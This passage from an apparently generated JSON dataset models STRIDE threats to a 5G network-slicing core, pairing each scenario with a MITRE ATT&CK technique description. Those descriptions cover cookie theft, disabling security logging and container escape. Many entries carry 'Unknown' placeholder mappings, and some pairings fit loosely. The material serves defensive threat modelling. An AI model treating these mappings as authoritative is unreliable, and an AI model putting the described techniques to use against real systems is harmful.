                "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. \n\nJust-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Azure Just in Time Access 2023)\n\nAccount impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account, while service accounts with domain-wide delegation permission are permitted to impersonate Google Workspace accounts.(Citation: Google Cloud Service Account Authentication Roles)(Citation: Hunters Domain Wide Delegation Google Workspace 2023)(Citation: Google Cloud Just in Time Access 2023)(Citation: Palo Alto Unit 42 Google Workspace Domain Wide Delegation 2023) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) \n\nMany cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)\n\nWhile users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)\n\n**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",
                "id": "attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c",
                "technique_id": "T1548.005"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Exploitation of orchestration software vulnerabilities for root access.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerabilities in orchestration software",
                    "Role": "Software Developer",
                    "Condition": "Software is not regularly updated with security patches."
                },
                {
                    "Assumption": "No security hardening for orchestration components",
                    "Role": "Security Engineer",
                    "Condition": "Orchestration components are not hardened against attacks."
                },
                {
                    "Assumption": "Inadequate monitoring for exploitation attempts",
                    "Role": "SOC Analyst",
                    "Condition": "Exploitation attempts are not logged or reviewed."
                }
            ],
            "Potential Impact": "Complete control over orchestration functions, potentially affecting all network slices.",
            "MITRE ATT&CK Keywords": [
                "software vulnerabilities",
                "root access",
                "exploitation"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "10",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "Compromised User Credentials Allow Unauthorized Access to Network Functions",
            "Assumptions": [
                {
                    "Assumption": "An attacker has obtained legitimate user credentials through phishing or other means.",
                    "Role": "Attacker",
                    "Condition": "Valid credentials are needed for access."
                },
                {
                    "Assumption": "The user credentials provide sufficient permissions to access critical Network Functions.",
                    "Role": "System Administrator",
                    "Condition": "Access control policies are not sufficiently restrictive."
                },
                {
                    "Assumption": "The attacker can effectively use the credentials before detection.",
                    "Role": "Attacker",
                    "Condition": "Security monitoring is not timely or effective."
                }
            ],
            "Potential Impact": "Unauthorized access to network functions leading to potential information disclosure, data tampering, and service disruption.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "phishing",
                "account abuse",
                "network functions"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Man-in-the-Middle Attack on External Interfaces",
            "Assumptions": [
                {
                    "Assumption": "External interfaces do not use encrypted communication protocols.",
                    "Role": "System Designer",
                    "Condition": "Communication channels are insufficiently secured."
                },
                {
                    "Assumption": "An attacker can intercept communications between the 5G core slicing system and external networks.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to network paths between communication endpoints."
                },
                {
                    "Assumption": "The system does not properly authenticate messages or endpoints.",
                    "Role": "System Designer",
                    "Condition": "Lack of robust authentication mechanisms."
                }
            ],
            "Potential Impact": "Interception and potential modification of sensitive data in transit, leading to information disclosure and integrity compromise.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "network traffic manipulation",
                "man-in-the-middle",
                "external interfaces"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Fake NFVO Commands for Slice Orchestration",
            "Assumptions": [
                {
                    "Assumption": "The NFVO receives commands from sources it considers trusted without strong verification.",
                    "Role": "System Designer",
                    "Condition": "Trust assumptions without strict verification."
                },
                {
                    "Assumption": "An attacker has access to a privileged network position to inject or spoof NFVO commands.",
                    "Role": "Attacker",
                    "Condition": "Presence on the network where commands are transmitted."
                },
                {
                    "Assumption": "The system does not implement multi-factor authentication for sensitive operations.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust authentication mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized control over network slice orchestration, potentially leading to disruption of services and data integrity issues.",
            "MITRE ATT&CK Keywords": [
                "command injection",
                "orchestration manipulation",
                "spoofing commands",
                "network functions virtualization"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampered VNFs Leading to Malicious Network Behavior",
            "Assumptions": [
                {
                    "Assumption": "An attacker can gain access to the VNF management system.",
                    "Role": "Attacker",
                    "Condition": "Lack of stringent access controls or security monitoring."
                },
                {
                    "Assumption": "The tampered VNFs pass integrity checks or there are no integrity checks in place.",
                    "Role": "System Designer",
                    "Condition": "Inadequate integrity validation mechanisms."
                },
                {
                    "Assumption": "Network traffic emanating from the tampered VNFs does not raise alerts.",
                    "Role": "Network Administrator",
                    "Condition": "Insufficient network monitoring or alerting mechanisms."
                }
            ],
            "Potential Impact": "Compromised data integrity and unauthorized network behavior, potentially leading to breaches and service disruption.",
            "MITRE ATT&CK Keywords": [
                "network behavior manipulation",
                "tampering",
                "integrity compromise",
                "virtual network functions"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Tampered Configuration Files in Orchestration and Management Components",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are stored in a location accessible to the attacker.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigured or poorly secured file systems."
                },
                {
                    "Assumption": "The system does not regularly verify the integrity of configuration files.",
                    "Role": "System Administrator",
                    "Condition": "Lack of integrity monitoring or verification processes."
                },
                {
                    "Assumption": "Attacker has the necessary permissions or exploit methods to modify configuration files.",
                    "Role": "Attacker",
                    "Condition": "Privilege escalation or sufficient permissions."
                }
            ],
            "Potential Impact": "Unauthorized changes to system behavior and potential disruption, impacting both integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "configuration tampering",
                "orchestration manipulation",
                "file system manipulation",
                "management components"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Firmware Tampering in Edge and Cloud Computing Nodes",
            "Assumptions": [
                {
                    "Assumption": "Edge and cloud computing nodes accept firmware updates from untrusted sources.",
                    "Role": "System Administrator",
                    "Condition": "Lack of stringent firmware update validation."
                },
                {
                    "Assumption": "Attacker has physical or remote access to these nodes or their update mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Presence in the network or physical environment."
                },
                {
                    "Assumption": "System lacks robust logging and alerting for firmware changes.",
                    "Role": "System Designer",
                    "Condition": "Insufficient monitoring and alerting mechanisms in place."
                }
            ],
            "Potential Impact": "Integrity compromise and potential backdoors within the edge and cloud nodes, impacting the confidentiality and availability of services.",
            "MITRE ATT&CK Keywords": [
                "firmware manipulation",
                "edge computing tampering",
                "cloud node tampering",
                "backdoor implantation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Lack of Audit Trails for NFVO Actions",
            "Assumptions": [
                {
                    "Assumption": "Actions performed by the NFVO are not logged sufficiently.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive logging mechanisms."
                },
                {
                    "Assumption": "The system does not enforce non-repudiation measures on critical actions.",
                    "Role": "System Designer",
                    "Condition": "Absence of cryptographic measures for action validation."
                },
                {
                    "Assumption": "Unauthorized actions by entities bypass logging or audit controls.",
                    "Role": "Attacker",
                    "Condition": "Exploitable logging mechanisms."
                }
            ],
            "Potential Impact": "Difficulty in tracking changes and actions, leading to challenges in incident investigation and accountability.",
            "MITRE ATT&CK Keywords": [
                "audit trail deficiency",
                "repudiation",
                "logging bypass"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Inadequate Logging of External Interface Transactions",
            "Assumptions": [
                {
                    "Assumption": "Transactions via external interfaces are not logged in detail.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient transaction logging mechanisms."
                },
                {
                    "Assumption": "External interfaces are used for critical interactions without strong tracking measures.",
                    "Role": "System Designer",
                    "Condition": "Lack of comprehensive audit logging."
                },
                {
                    "Assumption": "System does not validate the authenticity of external transactions.",
                    "Role": "System Designer",
                    "Condition": "Unverified external transactions."
                }
            ],
            "Potential Impact": "Entities can deny performing particular transactions, complicating forensic analysis and accountability.",
            "MITRE ATT&CK Keywords": [
                "external transaction manipulation",
                "logging inadequacy",
                "repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Unlogged Changes to Network Slice Configurations",
            "Assumptions": [
                {
                    "Assumption": "Network slice configuration changes are not comprehensively logged.",
                    "Role": "System Administrator",
                    "Condition": "Absence of robust logging policy for configurations."
                },
                {
                    "Assumption": "Configuration management system allows changes without proper verification or recording.",
                    "Role": "System Designer",
                    "Condition": "Weak configuration management controls."
                },
                {
                    "Assumption": "Attacker can perform configuration changes unnoticed due to inadequate logging.",
                    "Role": "Attacker",
                    "Condition": "Bypassing logging mechanisms."
                }
            ],
            "Potential Impact": "Changes to network slices may go untracked, leading to unauthorized modifications and difficulty in tracing actions.",
            "MITRE ATT&CK Keywords": [
                "configuration modification",
                "repudiation",
                "insufficient logging",
                "network slices"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive Data Exfiltration via Network Slices",
            "Assumptions": [
                {
                    "Assumption": "Attacker has access to network slices handling sensitive data.",
                    "Role": "Attacker",
                    "Condition": "Compromised network slice security."
                },
                {
                    "Assumption": "Data is transmitted without sufficient encryption across network slices.",
                    "Role": "System Designer",
                    "Condition": "Use of unencrypted data transmission."
                },
                {
                    "Assumption": "System lacks robust monitoring for data exfiltration activities.",
                    "Role": "System Administrator",
                    "Condition": "Weak network monitoring capabilities."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive data, leading to serious confidentiality breaches.",
            "MITRE ATT&CK Keywords": [
                "data exfiltration",
                "sensitive data exposure",
                "network slices",
                "unencrypted transmission"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposure of VNF Data Through Unsecured APIs",
            "Assumptions": [
                {
                    "Assumption": "APIs for VNFs are not secured adequately.",
                    "Role": "System Designer",
                    "Condition": "Absence of strong API security mechanisms."
                },
                {
                    "Assumption": "APIs are accessible from untrusted networks or entities.",
                    "Role": "System Administrator",
                    "Condition": "Unrestricted API access."
                },
                {
                    "Assumption": "API calls are not validated or monitored for abnormal patterns.",
                    "Role": "System Administrator",
                    "Condition": "Poor API call validation and monitoring."
                }
            ],
            "Potential Impact": "Unauthorized access to VNF data via exposed APIs, compromising data confidentiality.",
            "MITRE ATT&CK Keywords": [
                "API security flaws",
                "data exposure",
                "VNF data compromise"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unencrypted Data on Edge and Cloud Nodes",
            "Assumptions": [
                {
                    "Assumption": "Data stored on edge and cloud nodes is not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Lack of data encryption at rest."
                },
                {
                    "Assumption": "Attacker obtains access to edge or cloud nodes.",
                    "Role": "Attacker",
                    "Condition": "Compromised nodes' security."
                },
                {
                    "Assumption": "Access control mechanisms are insufficient to prevent unauthorized access.",
                    "Role": "System Designer",
                    "Condition": "Weak access control on nodes."
                }
            ],
            "Potential Impact": "Sensitive data exposure through unauthorized node access, affecting confidentiality.",
            "MITRE ATT&CK Keywords": [
                "unencrypted data",
                "edge node exposure",
                "cloud node exposure",
                "data confidentiality"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "DDoS Attack Targeting Critical Network Functions",
            "Assumptions": [
                {
                    "Assumption": "An attacker has the capability to generate large amounts of traffic targeting specific Network Functions.",
                    "Role": "Attacker",
                    "Condition": "Access to sufficient resources for large-scale DDoS."
                },
                {
                    "Assumption": "Network Functions are not adequately protected against DDoS attacks.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate DDoS mitigation mechanisms."
                },
                {
                    "Assumption": "The network does not have sufficient redundancy or failover mechanisms.",
                    "Role": "Network Designer",
                    "Condition": "Lack of robust failover processes."
                }
            ],
            "Potential Impact": "Disruption of critical network services impacting availability and potentially leading to extensive service outages.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network disruption",
                "service outage",
                "availability compromise"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Resource Exhaustion via Maliciously Configured VNFs",
            "Assumptions": [
                {
                    "Assumption": "Attacker can deploy or configure VNFs without proper oversight.",
                    "Role": "Attacker",
                    "Condition": "Weak VNF deployment policies."
                },
                {
                    "Assumption": "The system does not monitor resource usage effectively.",
                    "Role": "System Administrator",
                    "Condition": "Lack of resource monitoring mechanisms."
                },
                {
                    "Assumption": "There is insufficient limitation on the resources any single VNF can consume.",
                    "Role": "System Designer",
                    "Condition": "No resource usage caps in place."
                }
            ],
            "Potential Impact": "Exhaustion of system resources leading to significant slowdown or service unavailability, impacting critical services.",
            "MITRE ATT&CK Keywords": [
                "resource exhaustion",
                "VNF misconfiguration",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of External Interface Vulnerabilities",
            "Assumptions": [
                {
                    "Assumption": "External interfaces are susceptible to known or unknown vulnerabilities.",
                    "Role": "System Designer",
                    "Condition": "Unpatched security vulnerabilities."
                },
                {
                    "Assumption": "Attacker can remotely exploit these vulnerabilities to disrupt services.",
                    "Role": "Attacker",
                    "Condition": "Exploitable vulnerabilities and remote access capabilities."
                },
                {
                    "Assumption": "Lack of effective intrusion detection and prevention mechanisms.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate IDS/IPS deployment."
                }
            ],
            "Potential Impact": "Disruption of communication channels and external services impacting the overall system availability.",
            "MITRE ATT&CK Keywords": [
                "external interface exploitation",
                "remote exploitation",
                "service disruption"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Escalation via Vulnerabilities in Virtualization Layer",
            "Assumptions": [
                {
                    "Assumption": "An attacker has access to the virtualization layer through compromised credentials or local exploits.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or known exploits."
                },
                {
                    "Assumption": "The virtualization layer has unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Vulnerable or outdated virtualization software."
                },
                {
                    "Assumption": "Access control mechanisms are inadequate to prevent privilege escalation.",
                    "Role": "System Designer",
                    "Condition": "Weak access control policies."
                }
            ],
            "Potential Impact": "Attacker gains elevated privileges, providing unauthorized control over network functions and resources.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "virtualization exploitation",
                "control takeover"
            ],
            "mitre_technique": {
                "name": "Escape to Host",
                "description": "Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host\u2019s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, accessing other containers running on the host, or setting up a command and control channel on the host.",
                "id": "attack-pattern--4a5b7ade-8bb5-4853-84ed-23f262002665",
                "technique_id": "T1611"
            }
        },
